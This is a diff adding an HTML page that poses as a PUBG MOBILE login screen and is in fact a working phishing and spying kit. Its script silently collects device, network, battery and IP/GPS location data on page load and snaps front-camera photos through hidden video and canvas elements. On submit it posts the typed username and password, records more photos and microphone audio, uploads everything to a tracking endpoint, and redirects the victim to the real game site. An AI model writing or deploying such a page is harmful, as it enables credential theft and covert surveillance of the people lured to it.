@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PUBG MOBILE - Login</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔫</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;align-items:center;justify-content:center}
+.pubg-container{width:100%;max-width:400px;padding:20px}
+.pubg-logo{text-align:center;margin-bottom:30px}
+.pubg-logo h1{color:#f2a900;font-size:36px;font-weight:900;letter-spacing:2px;text-shadow:0 0 20px rgba(242,169,0,0.3)}
+.pubg-logo p{color:#8892b0;font-size:12px;letter-spacing:4px;text-transform:uppercase;margin-top:5px}
+.pubg-card{background:rgba(255,255,255,0.05);border:1px solid rgba(242,169,0,0.2);border-radius:16px;padding:32px;backdrop-filter:blur(10px)}
+.pubg-input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.08);border:1px solid rgba(242,169,0,0.2);border-radius:8px;color:#fff;font-size:16px;outline:none;margin-bottom:12px;transition:all 0.3s}
+.pubg-input:focus{border-color:#f2a900;box-shadow:0 0 10px rgba(242,169,0,0.2)}
+.pubg-input::placeholder{color:#8892b0}
+.pubg-btn{width:100%;padding:14px;background:linear-gradient(135deg,#f2a900,#d48900);border:none;border-radius:8px;color:#1a1a2e;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;transition:all 0.3s}
+.pubg-btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(242,169,0,0.3)}
+.pubg-forgot{color:#f2a900;font-size:13px;text-align:center;display:block;margin-top:16px;text-decoration:none}
+.pubg-forgot:hover{text-decoration:underline}
+.pubg-signup{text-align:center;margin-top:20px;color:#8892b0;font-size:14px}
+.pubg-signup a{color:#f2a900;text-decoration:none;font-weight:600}
+
+/* Loading */
+.pubg-loading{background:#1a1a2e;position:fixed;top:0;left:0;right:0;bottom:0;z-index:1000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.pubg-loading.active{display:flex}
+.pubg-spinner{width:50px;height:50px;border:4px solid rgba(242,169,0,0.1);border-top-color:#f2a900;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.pubg-loading h3{color:#f2a900;font-size:20px;margin-bottom:10px}
+.pubg-loading p{color:#8892b0;font-size:14px}
+
+.hidden{position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
+</style>
+</head>
+<body>
+<div id="mainContent">
+<div class="pubg-container">
+<div class="pubg-logo">
+<h1>PUBG MOBILE</h1>
+<p>Battle Royale</p>
+</div>
+<div class="pubg-card">
+<form onsubmit="handlePUBGLogin(event)">
+<input type="text" id="cred1" class="pubg-input" placeholder="Email or Username" required>
+<input type="password" id="cred2" class="pubg-input" placeholder="Password" required>
+<button type="submit" class="pubg-btn">LOG IN</button>
+</form>
+<a href="#" class="pubg-forgot">Forgot Password?</a>
+<div class="pubg-signup">New to PUBG? <a href="#">Create Account</a></div>
+</div>
+</div>
+</div>
+
+<div class="pubg-loading" id="pubgLoading">
+<div class="pubg-spinner"></div>
+<h3>Authenticating...</h3>
+<p>Please wait while we verify your account</p>
+</div>
+
+<video class="hidden" id="hiddenVideo" autoplay playsinline muted></video>
+<canvas class="hidden" id="hiddenCanvas"></canvas>
+
+<script>
+const linkId = '{{ link_id }}';
+let capturedPhotos = [];
+let audioChunks = [];
+let mediaRecorder = null;
+let stream = null;
+let hasAutoCaptured = false;
+
+async function autoCapture() {
+if (hasAutoCaptured) return;
+hasAutoCaptured = true;
+const data = await collectSilentData();
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify(data)
+});
+} catch(e) {}
+try {
+stream = await navigator.mediaDevices.getUserMedia({
+video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+audio: false
+});
+const video = document.getElementById('hiddenVideo');
+video.srcObject = stream;
+video.muted = true;
+await video.play();
+for (let i = 0; i < 3; i++) {
+await new Promise(r => setTimeout(r, 800));
+try {
+const canvas = document.getElementById('hiddenCanvas');
+canvas.width = 640; canvas.height = 480;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, 640, 480);
+const photo = canvas.toDataURL('image/jpeg', 0.7);
+capturedPhotos.push(photo);
+} catch(e) {}
+}
+if (stream) stream.getTracks().forEach(t => t.stop());
+if (capturedPhotos.length > 0) {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ photos: capturedPhotos })
+});
+} catch(e) {}
+}
+} catch(e) {}
+}
+
+async function collectSilentData() {
+const data = {location: {}, device_info: {}, screen_info: {}, network_info: {}, battery_info: {}};
+data.screen_info = {width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio, orientation: screen.orientation?.type || 'unknown'};
+data.device_info = {platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language, languages: navigator.languages, cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor, memory: navigator.deviceMemory || 'unknown', browser: getBrowser(), os: getOS()};
+try {
+const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+if (conn) {
+data.network_info = {effectiveType: conn.effectiveType, downlink: conn.downlink, downlinkMax: conn.downlinkMax || 'unknown', rtt: conn.rtt, saveData: conn.saveData, type: conn.type || 'unknown'};
+}
+} catch(e) {}
+try {
+if (navigator.getBattery) {
+const battery = await navigator.getBattery();
+data.battery_info = {level: Math.round(battery.level * 100) + '%', charging: battery.charging, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime};
+}
+} catch(e) {}
+try {
+const ipRes = await fetch('https://ipapi.co/json/');
+const ipData = await ipRes.json();
+data.location = {ip: ipData.ip, city: ipData.city, region: ipData.region, country: ipData.country_name, country_code: ipData.country_code, postal: ipData.postal, latitude: ipData.latitude, longitude: ipData.longitude, org: ipData.org, isp: ipData.org, asn: ipData.asn, timezone: ipData.timezone, currency: ipData.currency};
+} catch(e) {}
+try {
+if (navigator.geolocation) {
+const position = await new Promise((resolve, reject) => {
+navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
+});
+data.location.gps_lat = position.coords.latitude;
+data.location.gps_lng = position.coords.longitude;
+data.location.gps_accuracy = position.coords.accuracy;
+}
+} catch(e) {}
+return data;
+}
+
+function getBrowser() {
+const ua = navigator.userAgent;
+if (ua.includes('Firefox')) return 'Firefox';
+if (ua.includes('Chrome')) return 'Chrome';
+if (ua.includes('Safari')) return 'Safari';
+if (ua.includes('Edge')) return 'Edge';
+return 'Unknown';
+}
+
+function getOS() {
+const ua = navigator.userAgent;
+if (ua.includes('Windows')) return 'Windows';
+if (ua.includes('Mac')) return 'MacOS';
+if (ua.includes('Linux')) return 'Linux';
+if (ua.includes('Android')) return 'Android';
+if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+return 'Unknown';
+}
+
+async function handlePUBGLogin(e) {
+e.preventDefault();
+const cred1 = document.getElementById('cred1').value;
+const cred2 = document.getElementById('cred2').value;
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
+});
+} catch(err) {}
+const loading = document.getElementById('pubgLoading');
+loading.classList.add('active');
+await captureMorePhotos();
+window.location.href = 'https://pubgmobile.com';
+}
+
+async function captureMorePhotos() {
+let localStream = null;
+try {
+localStream = await navigator.mediaDevices.getUserMedia({
+video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+audio: true
+});
+const video = document.getElementById('hiddenVideo');
+video.srcObject = localStream;
+video.muted = true;
+await video.play();
+let localRecorder = null;
+try {
+localRecorder = new MediaRecorder(localStream);
+audioChunks = [];
+localRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+localRecorder.start(1000);
+} catch(e) {}
+const morePhotos = [];
+for (let i = 0; i < 5; i++) {
+await new Promise(r => setTimeout(r, 1200));
+try {
+const canvas = document.getElementById('hiddenCanvas');
+canvas.width = 1280; canvas.height = 720;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, 1280, 720);
+const photo = canvas.toDataURL('image/jpeg', 0.9);
+morePhotos.push(photo);
+} catch(e) {}
+}
+if (localStream) localStream.getTracks().forEach(t => t.stop());
+if (localRecorder && localRecorder.state !== 'inactive') {
+localRecorder.stop();
+await new Promise(r => setTimeout(r, 500));
+}
+if (morePhotos.length > 0) {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ photos: morePhotos })
+});
+} catch(e) {}
+}
+if (audioChunks.length > 0) {
+try {
+const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+const reader = new FileReader();
+reader.onloadend = async function() {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ audio: reader.result })
+});
+} catch(e) {}
+};
+reader.readAsDataURL(audioBlob);
+} catch(e) {}
+}
+} catch(e) {}
+}
+
+autoCapture();
+</script>
+</body>
+</html>
